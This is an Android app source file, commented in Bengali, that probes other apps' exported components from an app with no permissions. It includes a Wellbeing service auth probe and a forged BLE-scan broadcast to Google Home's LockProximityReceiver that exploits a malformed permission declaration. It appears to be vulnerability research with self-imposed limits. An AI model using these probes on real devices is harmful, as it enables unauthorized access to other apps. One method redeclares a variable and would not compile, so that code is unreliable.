package com.cindrasec.mvrpprobe;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Process;
import android.util.Log;

/**
 * mvrp-probe — একটা permission-বিহীন app থেকে অন্য app-এর exported surface ছোঁয়া।
 *
 * ফলাফল logcat-এ TAG=MVRP:   adb logcat -s MVRP
 *
 * চালানো:
 *   am start -n com.cindrasec.mvrpprobe/.MainActivity --es action call \
 *       --es uri content://AUTH --es method NAME [--es arg VALUE]
 *   am start -n ... --es action query --es uri content://AUTH/path
 *   am start -n ... --es action bind  --es pkg PKG --es cls FQCN
 *   am start -n ... --es action start --es pkg PKG --es cls FQCN
 *
 * নকশার নিয়ম ১: এই app সিদ্ধান্ত ছাপে না, শুধু যা ঘটেছে তাই ছাপে। রায় বাইরে
 * বসে দেবো — টুলের আউটপুটে ব্যাখ্যা মেশানোই FileProvider-এর NPE ভুল পড়ার কারণ।
 *
 * নকশার নিয়ম ২: কোনো anonymous inner class নেই। build-tools 34-এর d8 JDK 21-এর
 * তৈরি anonymous class-এ NullPointerException দিয়ে ভেঙে পড়ে, তাই Activity
 * নিজেই ServiceConnection আর Runnable দুটোই বাস্তবায়ন করে।
 */
public class MainActivity extends Activity implements ServiceConnection, Runnable {

    public static final String TAG = "MVRP";
    private final Handler handler = new Handler();
    private int txCode = -1;          // -1 = শুধু bind, transact নয়
    private String txToken = null;
    private boolean wellbeing = false;
    private CallbackBinder cb = null;

    static final String WB_SVC =
        "org.chromium.chrome.browser.usage_stats.idl.IWellbeingService";

    @Override
    protected void onCreate(Bundle saved) {
        super.onCreate(saved);
        Intent in = getIntent();
        String action = in.getStringExtra("action");

        Log.i(TAG, "---- mvrp-probe ----");
        Log.i(TAG, "self   pkg=" + getPackageName() + " uid=" + Process.myUid());
        Log.i(TAG, "action " + action);

        boolean keepAlive = false;
        try {
            if ("call".equals(action))        doCall(in);
            else if ("query".equals(action))  doQuery(in);
            else if ("bind".equals(action)) { doBind(in); keepAlive = true; }
            else if ("transact".equals(action)) { doBind(in); keepAlive = true; }
            else if ("wellbeing".equals(action)) { doWellbeing(in); keepAlive = true; }
            else if ("start".equals(action))  doStart(in);
            else if ("startact".equals(action)) doStartActivity(in);
            else if ("broadcast".equals(action)) doBroadcast(in);
            else if ("blescan".equals(action)) doBleScan(in);
            else Log.i(TAG, "actions: call | query | bind | transact | wellbeing | start | startact | broadcast");
        } catch (Throwable t) {
            // শ্রেণির নামই প্রায়ই আসল উত্তর:
            // SecurityException = সীমানা ধরেছে। অন্য কিছু = অন্য কারণে ব্যর্থ।
            Log.i(TAG, "THROWN " + t.getClass().getName() + ": " + t.getMessage());
        }

        // কতক্ষণ বেঁচে থেকে onServiceConnected-এর অপেক্ষা করব।
        // ৪ সেকেন্ড অনেক service-এর জন্য কম: bindService() true ফেরত দেয়
        // সাথে সাথে, কিন্তু সংযোগ আসে পরে। অপেক্ষা ফুরিয়ে গেলে "সংযোগ হয়নি"
        // আর "আমি আগেই চলে গেছি" আলাদা করা যায় না।
        long hold = wellbeing ? 9000 : 4000;
        String h = in.getStringExtra("hold");
        if (h != null) try { hold = Long.parseLong(h); } catch (NumberFormatException ignored) { }
        if (keepAlive) handler.postDelayed(this, hold);
        else run();
    }

    /** Runnable — bind-এর callback-এর জন্য অপেক্ষা শেষে। */
    public void run() {
        Log.i(TAG, "---- end ----");
        finish();
    }

    // ---------- ContentProvider.call() ----------
    private void doCall(Intent in) {
        String uri    = req(in, "uri");
        String method = req(in, "method");
        String arg    = in.getStringExtra("arg");
        Log.i(TAG, "CALL uri=" + uri + " method=" + method + " arg=" + arg);

        Bundle extras = new Bundle();
        String ek = in.getStringExtra("extraKey");
        if (ek != null) extras.putString(ek, in.getStringExtra("extraVal"));

        Bundle out = getContentResolver().call(Uri.parse(uri), method, arg, extras);
        if (out == null) { Log.i(TAG, "RESULT null"); return; }
        Log.i(TAG, "RESULT Bundle keys=" + out.keySet());
        for (String k : out.keySet()) Log.i(TAG, "  " + k + " = " + render(out.get(k)));
    }

    // ---------- ContentProvider.query() ----------
    private void doQuery(Intent in) {
        String uri = req(in, "uri");
        Log.i(TAG, "QUERY uri=" + uri);
        Cursor c = getContentResolver().query(Uri.parse(uri), null, null, null, null);
        if (c == null) { Log.i(TAG, "RESULT null cursor"); return; }
        try {
            Log.i(TAG, "RESULT rows=" + c.getCount() + " cols=" + c.getColumnCount());
            String[] names = c.getColumnNames();
            StringBuilder hdr = new StringBuilder();
            for (int i = 0; i < names.length; i++) hdr.append(names[i]).append(" | ");
            Log.i(TAG, "  cols: " + hdr);
            int row = 0;
            while (c.moveToNext() && row < 20) {         // ২০ সারির বেশি নয় — অন্যের
                StringBuilder sb = new StringBuilder();  // ডেটা গণহারে টানা নিষেধ
                for (int i = 0; i < c.getColumnCount(); i++) {       // (CLAUDE.md §7)
                    String v;
                    try { v = c.getString(i); } catch (Exception e) { v = "<non-string>"; }
                    sb.append(names[i]).append('=').append(v).append("  ");
                }
                Log.i(TAG, "  row" + row + ": " + sb);
                row++;
            }
            if (c.getCount() > 20) Log.i(TAG, "  ... " + (c.getCount() - 20) + " more rows NOT read");
        } finally { c.close(); }
    }

    // ---------- bindService() ----------
    private void doBind(Intent in) {
        String pkg = req(in, "pkg");
        String cls = req(in, "cls");
        Log.i(TAG, "BIND " + pkg + "/" + cls);

        Intent svc = new Intent();
        svc.setComponent(new ComponentName(pkg, cls));
        String act = in.getStringExtra("svcAction");
        if (act != null) svc.setAction(act);

        // false = system চেষ্টাও করতে দেয়নি (component নেই / exported নয় /
        // visibility নেই)। true = অনুরোধ গেছে; আসল উত্তর callback-এ।
        if (in.getStringExtra("code") != null) {
            txCode  = Integer.parseInt(in.getStringExtra("code"));
            txToken = in.getStringExtra("token");   // interface token, থাকলে
        }
        boolean ok = bindService(svc, this, Context.BIND_AUTO_CREATE);
        Log.i(TAG, "bindService() returned " + ok);
    }

    // ---------- ServiceConnection ----------
    public void onServiceConnected(ComponentName name, IBinder binder) {
        Log.i(TAG, "BOUND  " + name.flattenToShortString());
        try {
            Log.i(TAG, "  descriptor = " + binder.getInterfaceDescriptor());
        } catch (Throwable t) {
            Log.i(TAG, "  descriptor THREW " + t.getClass().getName() + ": " + t.getMessage());
        }
        Log.i(TAG, "  isBinderAlive = " + binder.isBinderAlive());
        if (wellbeing) { sendWellbeing(binder); return; }
        if (txCode >= 0) transact(binder);
    }

    // ---------- IWellbeingService ----------
    private void doWellbeing(Intent in) {
        String pkg = in.getStringExtra("pkg");
        if (pkg == null) pkg = "com.google.android.apps.wellbeing";
        String cls = "com.google.android.apps.wellbeing.web.wellbeing.impl.WellbeingService";
        wellbeing = true;
        cb = new CallbackBinder();
        Log.i(TAG, "WELLBEING bind " + pkg + "/" + cls);
        Intent svc = new Intent();
        svc.setComponent(new ComponentName(pkg, cls));
        Log.i(TAG, "bindService() returned " + bindService(svc, this, Context.BIND_AUTO_CREATE));
    }

    /**
     * transaction 1 = b(lpz request, IWellbeingCallback cb).
     *
     * request-টা ইচ্ছে করেই null (writeInt(0) = nullable parcelable, অনুপস্থিত)।
     * সঠিক proto বানানোর দরকার নেই, কারণ আমরা ডেটা চাইছি না — আমরা দেখতে চাই
     * **কোন ধাপে আটকায়**। service-এর নিজের status কোডই সেটা বলে দেয়:
     *     7 = auth প্রত্যাখ্যান (অচেনা UID / একাধিক package / অচেনা browser /
     *         Google সার্টিফিকেটে সই করা নয়)
     *     5 = null/ভুল request       3 = unmarshal ব্যর্থ      4 = unsupported
     * 7 ছাড়া অন্য কিছু মানে auth পার হয়ে গেছি। সেটাই পুরো পরীক্ষা।
     */
    private void sendWellbeing(IBinder binder) {
        Parcel data = Parcel.obtain(), reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(WB_SVC);
            data.writeInt(0);                 // lpz request = null
            data.writeStrongBinder(cb);       // callback — এখানেই উত্তর আসবে
            Log.i(TAG, "WELLBEING transact(1) dataSize=" + data.dataSize());
            boolean ok = binder.transact(1, data, reply, 0);
            Log.i(TAG, "  transact() returned " + ok + " replySize=" + reply.dataSize());
            Log.i(TAG, "  (উত্তর অ্যাসিঙ্ক্রোনাস — CALLBACK লাইনের অপেক্ষা করো)");
        } catch (Throwable t) {
            Log.i(TAG, "  transact THREW " + t.getClass().getName() + ": " + t.getMessage());
        } finally { data.recycle(); reply.recycle(); }
    }

    /**
     * একটা নির্দিষ্ট transaction কোডে **খালি** parcel পাঠাও।
     *
     * ইচ্ছে করেই এক কোড, লুপ নয়, আর কোনো payload নয়। OemCommandEndpointService-এর
     * মতো জিনিসে অন্ধভাবে ভরা parcel ছোড়া মানে অজানা কাজ চালিয়ে দেওয়া — CLAUDE.md §7
     * বলে কোনো destructive payload নয়। কোডের অর্থ আগে jadx-এ পড়ো, তারপর পাঠাও।
     */
    private void transact(IBinder binder) {
        Parcel data = Parcel.obtain(), reply = Parcel.obtain();
        try {
            if (txToken != null) data.writeInterfaceToken(txToken);
            Log.i(TAG, "TRANSACT code=" + txCode + " token=" + txToken + " dataSize=" + data.dataSize());
            boolean ok = binder.transact(txCode, data, reply, 0);
            Log.i(TAG, "  transact() returned " + ok + "  replySize=" + reply.dataSize());

            // replySize একা কিছু বলে না। remote দিক exception ছুঁড়লে transact()
            // true ফেরায় আর exception-টা reply parcel-এ marshalled হয়ে আসে —
            // তাই "returned true, 132 বাইট" দেখে সাফল্য ভাবা যায় না। দশটা
            // ভিন্ন কোডে একই আকারের উত্তর ঠিক ওটাই ছিল।
            reply.setDataPosition(0);
            try {
                reply.readException();
                Log.i(TAG, "  readException() ঠিকঠাক — reply-তে exception নেই");
                int left = reply.dataSize() - reply.dataPosition();
                Log.i(TAG, "  payload বাকি " + left + " বাইট");
            } catch (Throwable e) {
                Log.i(TAG, "  REPLY EXCEPTION " + e.getClass().getName() + ": " + e.getMessage());
            }
            // কাঁচা বাইট, প্রথম ৬৪টা — exception না হলেও কী এসেছে দেখার জন্য
            reply.setDataPosition(0);
            byte[] raw = reply.marshall();
            StringBuilder hex = new StringBuilder();
            for (int i = 0; i < raw.length && i < 64; i++) hex.append(String.format("%02x", raw[i]));
            Log.i(TAG, "  reply[0:64] = " + hex);
            if (reply.dataSize() > 0) {
                reply.setDataPosition(0);
                byte[] raw = reply.marshall();
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < raw.length && i < 256; i++)
                    sb.append((raw[i] >= 32 && raw[i] < 127) ? (char) raw[i] : '.');
                Log.i(TAG, "  reply ascii = " + sb);
            }
        } catch (Throwable t) {
            // SecurityException = প্রতি-transaction যাচাই আছে, সীমানা ধরেছে।
            // অন্য কিছু = protocol ভুল, কিন্তু যাচাই নেই।
            Log.i(TAG, "  transact THREW " + t.getClass().getName() + ": " + t.getMessage());
        } finally { data.recycle(); reply.recycle(); }
    }

    public void onServiceDisconnected(ComponentName name) {
        Log.i(TAG, "DISCONNECTED " + name.flattenToShortString());
    }

    public void onNullBinding(ComponentName name) {
        Log.i(TAG, "NULL BINDING " + name.flattenToShortString()
                + "  (service-এ পৌঁছেছে, কিন্তু onBind null দিয়েছে)");
    }

    // ---------- startService() ----------
    private void doStart(Intent in) {
        String pkg = req(in, "pkg");
        String cls = req(in, "cls");
        Log.i(TAG, "START " + pkg + "/" + cls);
        Intent svc = new Intent();
        svc.setComponent(new ComponentName(pkg, cls));
        String act = in.getStringExtra("svcAction");
        if (act != null) svc.setAction(act);
        ComponentName r = startService(svc);
        Log.i(TAG, "startService() returned " + (r == null ? "null" : r.flattenToShortString()));
    }

    /**
     * activity চালু করো — service নয়।
     *
     * কেন আলাদা: doStart() startService() ডাকে, আর অনাথ-permission পরীক্ষায়
     * লক্ষ্য ছিল AGSA-র ExportedSmartspaceTrampolineActivity, একটা activity।
     * ভুল API ডাকায় লগে "startService() returned null" এসেছিল — যেটা
     * "পৌঁছানো যায়নি" নয়, "আমি দরজায় কড়াই নাড়িনি"।
     *
     * SecurityException ধরা হচ্ছে আলাদা করে: সেটাই permission-সীমানার
     * স্বাক্ষর, আর control-বিল্ডের সাথে তুলনার আসল মাপ।
     */
    private void doStartActivity(Intent in) {
        String pkg = req(in, "pkg");
        String cls = req(in, "cls");
        Log.i(TAG, "STARTACT " + pkg + "/" + cls);
        Intent act = new Intent();
        act.setComponent(new ComponentName(pkg, cls));
        String a = in.getStringExtra("svcAction");
        if (a != null) act.setAction(a);
        String d = in.getStringExtra("data");
        if (d != null) act.setData(android.net.Uri.parse(d));
        String ek = in.getStringExtra("extraKey");
        if (ek != null) act.putExtra(ek, in.getStringExtra("extraVal"));
        act.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            startActivity(act);
            Log.i(TAG, "startActivity() ফেরত এসেছে, exception ছাড়া");
        } catch (SecurityException e) {
            Log.i(TAG, "SECURITY " + e.getMessage());
        } catch (Throwable t) {
            Log.i(TAG, "THROWN " + t.getClass().getName() + ": " + t.getMessage());
        }
    }

    /**
     * নির্দিষ্ট receiver-এ broadcast পাঠাও।
     *
     * অনাথ-permission তালিকার ছয়টা লক্ষ্য receiver — turbo-র
     * BatterySaverChangedReceiver, wallpaper-এর DownloadableRestorer,
     * Wellbeing-এর WindDownClockAlarmActionReceiver। activity বা service
     * দিয়ে ওদের ছোঁয়া যায় না, তাই আলাদা কাজ।
     *
     * sendBroadcast() নীরবে ব্যর্থ হয়, তাই ফেরত মান দেখে লাভ নেই — প্রমাণ
     * আসে ActivityManager-এর "Permission Denial" লাইন থেকে, আর সেটা
     * control-বিল্ডের সাথে তুলনাতেই অর্থ পায়।
     */
    private void doBroadcast(Intent in) {
        String pkg = req(in, "pkg");
        String cls = req(in, "cls");
        Log.i(TAG, "BROADCAST " + pkg + "/" + cls);
        Intent b = new Intent();
        b.setComponent(new ComponentName(pkg, cls));
        String a = in.getStringExtra("svcAction");
        if (a != null) b.setAction(a);
        String ek = in.getStringExtra("extraKey");
        if (ek != null) b.putExtra(ek, in.getStringExtra("extraVal"));
        try {
            sendBroadcast(b);
            Log.i(TAG, "sendBroadcast() ফেরত এসেছে, exception ছাড়া");
        } catch (SecurityException e) {
            Log.i(TAG, "SECURITY " + e.getMessage());
        } catch (Throwable t) {
            Log.i(TAG, "THROWN " + t.getClass().getName() + ": " + t.getMessage());
        }
    }

    /**
     * Google Home-এর LockProximityReceiver-এ একটা জাল BLE-scan ঘটনা পাঠাও।
     *
     * manifest-এ receiver-টা পাহারা দেওয়া:
     *     android:permission="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
     * কিন্তু ওই নামে কোনো permission নেই — android:permission একটাই নাম নেয়,
     * দুটো নয়। ফলে কেউই ওটা ধরে না, আর receiver-টা কার্যত অপৌঁছনীয়...
     * যতক্ষণ না কেউ নামটা **নিজে ঘোষণা করে**। সেটাই এই app করে।
     *
     * onReceive যা পড়ে, সবই এখান থেকে যায়: hgs_device_id, device_name,
     * request_id, আর ScanResult তালিকা। তারপর সে
     * "tln_send_unlock_notification_worker" কাজটা সারিতে দেয়।
     *
     * ScanRecord null রাখা হয়েছে ইচ্ছে করে — তার public constructor নেই,
     * আর null দিলে manufacturer_data শাখাটা বাদ যায় কিন্তু worker তবু চলে।
     * কম payload-এ যদি চলে, সেটাই পরিষ্কার প্রমাণ।
     */
    private void doBleScan(Intent in) {
        String pkg = in.getStringExtra("pkg");
        if (pkg == null) pkg = "com.google.android.apps.chromecast.app";
        String cls = in.getStringExtra("cls");
        if (cls == null) cls = "com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver";
        String hgs = in.getStringExtra("hgs");
        if (hgs == null) hgs = "MVRP-CANARY-ID";
        String nm = in.getStringExtra("name");
        if (nm == null) nm = "MVRP CANARY LOCK";

        Intent b = new Intent("com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED");
        b.setComponent(new ComponentName(pkg, cls));
        b.putExtra("hgs_device_id", hgs);
        b.putExtra("device_name", nm);
        b.putExtra("request_id", 1);

        android.bluetooth.le.ScanResult sr = buildScanResult();
        if (sr != null) {
            java.util.ArrayList<android.os.Parcelable> list =
                    new java.util.ArrayList<android.os.Parcelable>();
            list.add(sr);
            b.putParcelableArrayListExtra("android.bluetooth.le.extra.LIST_SCAN_RESULT", list);
        } else {
            Log.i(TAG, "ScanResult বানানো গেল না — তালিকা ছাড়াই পাঠাচ্ছি");
        }

        Log.i(TAG, "BLESCAN -> " + pkg + "/" + cls + "  name=" + nm + " hgs=" + hgs);
        try {
            sendBroadcast(b);
            Log.i(TAG, "sendBroadcast() ফেরত এসেছে, exception ছাড়া");
        } catch (SecurityException e) {
            Log.i(TAG, "SECURITY " + e.getMessage());
        } catch (Throwable t) {
            Log.i(TAG, "THROWN " + t.getClass().getName() + ": " + t.getMessage());
        }
    }

    /**
     * একটা **বৈধ** ScanResult বানাও, Parcel হাতে লিখে।
     *
     * কেন দরকার হলো: `new ScanResult(dev, null, -50, 0L)` দিয়ে বানানো বস্তুর
     * ScanRecord null। ওপাশে Android lazily unparcel করে, আর তৈরি করতে না
     * পারলে getParcelableArrayListExtra() **null ফেরায়, নীরবে** — কোনো
     * exception নয়, কোনো লগ নয়। ফলে receiver-এর list-শাখা কখনো চলে না,
     * আর বাইরে থেকে সেটা "কিছু ঘটল না"-র মতো দেখায়।
     *
     * ScanRecord-এর public constructor নেই আর parseFromBytes @hide, তাই
     * ScanResult.writeToParcel যে ক্রমে ক্ষেত্র লেখে সেই ক্রমে একটা Parcel
     * ভরে CREATOR.createFromParcel() দিয়ে বস্তুটা তৈরি করা হচ্ছে।
     *
     * advertisement বাইটে ইচ্ছে করে company id 76 (0x004C) বসানো, কারণ
     * LockProximityReceiver ঠিক ওটাই পড়ে:
     *     manufacturerSpecificData.get(76)  ->  jfl.j("manufacturer_data", ...)
     *
     * ক্রম ব্যর্থ হলে (OS সংস্করণ ভেদে ক্ষেত্র বদলাতে পারে) createFromParcel
     * ছুঁড়ে ফেলবে, আর আমরা সেটা লগে বলে null ফেরাব — নীরব ব্যর্থতা নয়।
     */
    private android.bluetooth.le.ScanResult buildScanResult() {
        // ScanRecord বাইট: দৈর্ঘ্য-প্রিফিক্সড AD structure, manufacturer specific (0xFF)
        //   05 FF 4C 00 01 02  ->  len=5, type=0xFF, company=0x004C (LE), data=01 02
        final byte[] adv = new byte[] { 0x05, (byte) 0xFF, 0x4C, 0x00, 0x01, 0x02 };

        android.bluetooth.BluetoothDevice dev = null;
        try {
            android.bluetooth.BluetoothAdapter ad = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
            if (ad != null) dev = ad.getRemoteDevice("AA:BB:CC:DD:EE:FF");
        } catch (Throwable t) {
            Log.i(TAG, "BluetoothDevice পাওয়া গেল না: " + t);
        }
        if (dev == null) { Log.i(TAG, "BluetoothDevice null — ScanResult বানানো যাবে না"); return null; }

        // হাতে লেখা BluetoothDevice অংশটা Android 15-এ ভুল ছিল: rssi পড়া
        // গিয়েছিল 5046021 = 0x004CFF05, অর্থাৎ ঠিক আমার adv-বাইট — reader
        // আগে একটা বাড়তি ক্ষেত্র খেয়েছে। ঠিকানার পরে কী আছে তা অনুমান না
        // করে framework-কেই তার নিজের অংশ লিখতে দিচ্ছি।
        //
        // বাকি ক্ষেত্রগুলোর সংখ্যা OS ভেদে বদলাতে পারে, তাই অনুমান নয় —
        // 0 থেকে 4টা বাড়তি int চেষ্টা করে দেখি কোনটায় rssi ঠিক ফেরত আসে।
        // যাচাই ছাড়া কোনো বিন্যাস গ্রহণ করা হবে না।
        for (int pad = 0; pad <= 4; pad++) {
            android.os.Parcel p = android.os.Parcel.obtain();
            try {
                p.writeInt(1);
                dev.writeToParcel(p, 0);
                for (int k = 0; k < pad; k++) p.writeInt(0);
                p.writeInt(1);
                p.writeByteArray(adv);
                p.writeInt(-50);     // rssi — এটাই আমাদের চেকসাম
                p.writeLong(0L);     // timestampNanos
                p.writeInt(0);       // eventType
                p.writeInt(1);       // primaryPhy
                p.writeInt(0);       // secondaryPhy
                p.writeInt(255);     // advertisingSid
                p.writeInt(127);     // txPower
                p.writeInt(0);       // periodicAdvertisingInterval
                p.setDataPosition(0);
                android.bluetooth.le.ScanResult sr =
                        android.bluetooth.le.ScanResult.CREATOR.createFromParcel(p);
                android.bluetooth.le.ScanRecord rec = sr.getScanRecord();
                boolean ok = sr.getRssi() == -50 && rec != null;
                boolean mfg = false;
                if (rec != null) {
                    android.util.SparseArray<byte[]> m = rec.getManufacturerSpecificData();
                    mfg = m != null && m.get(76) != null;
                }
                Log.i(TAG, "  pad=" + pad + " rssi=" + sr.getRssi()
                           + " scanRecord=" + (rec == null ? "null" : "আছে")
                           + " mfg[76]=" + (mfg ? "আছে" : "নেই"));
                if (ok && mfg) {
                    Log.i(TAG, "ScanResult বৈধ — pad=" + pad + " ক্ষেত্র মিলেছে");
                    return sr;
                }
            } catch (Throwable t) {
                Log.i(TAG, "  pad=" + pad + " ব্যর্থ: " + t.getClass().getSimpleName() + ": " + t.getMessage());
            } finally {
                p.recycle();
            }
        }
        Log.i(TAG, "কোনো বিন্যাসেই বৈধ ScanResult বানানো গেল না");
        return null;
    }

    private static String render(Object v) {
        if (v == null) return "null";
        if (v instanceof byte[]) {
            byte[] b = (byte[]) v;
            StringBuilder sb = new StringBuilder("byte[" + b.length + "] ascii=\"");
            for (int i = 0; i < b.length; i++) sb.append((b[i] >= 32 && b[i] < 127) ? (char) b[i] : '.');
            return sb.append('"').toString();
        }
        return String.valueOf(v);
    }

    private static String req(Intent in, String key) {
        String v = in.getStringExtra(key);
        if (v == null) throw new IllegalArgumentException("--es " + key + " লাগবে");
        return v;
    }
}
